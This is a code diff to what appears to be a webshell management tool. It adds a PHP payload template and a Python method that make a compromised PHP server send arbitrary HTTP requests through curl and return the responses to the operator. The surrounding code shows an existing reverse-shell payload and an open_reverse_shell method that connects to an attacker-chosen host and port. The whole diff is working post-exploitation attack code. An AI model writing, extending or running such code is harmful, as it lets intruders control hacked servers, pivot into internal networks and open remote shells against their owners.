@@ -30,6 +30,7 @@ from .base import (
     BasicInfoEntry,
     Option,
     OptionAlternative,
+    HttpResponseDict,
 )
 
 logger = logging.getLogger("core.php")
@@ -470,6 +471,68 @@ decoder_echo($content);
 )
 
 # TODO: add more methods
+
+SEND_HTTP_REQUEST_PHP = compress_phpcode_template(
+    """
+@session_write_close();
+if(!function_exists('curl_init')) {
+    decoder_echo('WRONG_NO_CURL');
+}else{
+    $ch = curl_init();
+    $url = {url};
+    $method = {method};
+    $reqHeaders = json_decode({headers}, true);
+    $params = json_decode({params}, true);
+    $data = {data};
+    if($params) {
+        $queryString = http_build_query($params);
+        $url .= (strpos($url, '?') === false ? '?' : '&') . $queryString;
+    }
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_HEADER, true);
+    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
+    if($reqHeaders) {
+        $headerArray = array();
+        foreach($reqHeaders as $key => $value) {
+            $headerArray[] = $key . ': ' . $value;
+        }
+        curl_setopt($ch, CURLOPT_HTTPHEADER, $headerArray);
+    }
+    if($data !== null && $data !== '') {
+        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+    }
+    $response = curl_exec($ch);
+    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    if($response === false) {
+        curl_close($ch);
+        decoder_echo('WRONG_CURL_ERROR');
+    }else{
+        $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
+        $responseHeaders = substr($response, 0, $headerSize);
+        $responseBody = substr($response, $headerSize);
+        $headerLines = explode("\\r\\n", $responseHeaders);
+        $responseHeaderDict = array();
+        foreach($headerLines as $line) {
+            $colonPos = strpos($line, ':');
+            if($colonPos !== false) {
+                $key = trim(substr($line, 0, $colonPos));
+                $value = trim(substr($line, $colonPos + 1));
+                $responseHeaderDict[$key] = $value;
+            }
+        }
+        curl_close($ch);
+        $result = array(
+            'status_code' => $httpCode,
+            'headers' => $responseHeaderDict,
+            'body' => base64_encode($responseBody)
+        );
+        decoder_echo(json_encode($result));
+    }
+}
+"""
+)
 
 REVERSE_SHELL = compress_phpcode_template(
     """
@@ -1123,12 +1186,44 @@ class PHPWebshellActions(PHPSessionInterface):
         )
         return first_string + second_string == result
 
-
     async def open_reverse_shell(self, host: str, port: int) -> None:
         code = format_phpcode(REVERSE_SHELL, host=string_repr(host), port=str(port))
         result = await self.submit(code)
         if result == "WRONG_NO_METHOD":
             raise exceptions.TargetError("目标打开反弹shell对应的函数")
+
+    async def send_http_request(
+        self,
+        url: str,
+        method: str = "GET",
+        headers: t.Optional[t.Dict[str, str]] = None,
+        params: t.Optional[t.Dict[str, t.Any]] = None,
+        data: t.Optional[t.Union[str, bytes]] = None,
+    ) -> HttpResponseDict:
+        data_str: t.Optional[str] = None
+        if isinstance(data, bytes):
+            data_str = base64_encode(data)
+        elif isinstance(data, str):
+            data_str = data
+        php_code = format_phpcode(
+            SEND_HTTP_REQUEST_PHP,
+            url=string_repr(url),
+            method=string_repr(method),
+            headers=string_repr(json.dumps(headers) if headers is not None else "null"),
+            params=string_repr(json.dumps(params) if params is not None else "null"),
+            data=string_repr(data_str) if data_str is not None else "null",
+        )
+        result = await self.submit(php_code)
+        if result == "WRONG_NO_CURL":
+            raise exceptions.TargetError("目标PHP不支持curl扩展")
+        if result == "WRONG_CURL_ERROR":
+            raise exceptions.TargetRuntimeError("curl_exec执行失败")
+        parsed = json.loads(result)
+        return HttpResponseDict(
+            status_code=parsed["status_code"],
+            headers=parsed["headers"],
+            body=base64.b64decode(parsed["body"]),
+        )
 
     async def get_basicinfo(self) -> t.List[BasicInfoEntry]:
         json_result = await self.submit(GET_BASIC_INFO_PHP)
